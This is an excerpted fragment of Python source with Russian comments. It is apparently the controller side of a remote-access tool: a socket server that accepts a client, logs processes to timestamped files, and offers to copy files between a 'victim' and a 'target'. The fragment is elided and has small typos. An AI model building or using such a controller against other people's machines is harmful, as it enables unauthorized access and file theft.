...
def proc():
    time = datetime.now()
    filename = 'info/rocesses_' + time.strftime('%Y-%m-%d-(%H-%M-%S)') + '.txt'
...
def copy_file():
    print("Choose option:\n(1) - copy from victim to target\n(2) - copy from target victim")
    choice = input(">>> ")
    print(choice)
...
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # описывает как сревер должен принимать информацию


server.bind((IP, PORT))  # установим IP-адрес и порт, по которому можно будет подключиться к серверу
server.listen(5) # запустим сервер
user, address = server.accept() # регистрируем подключенных клиентов
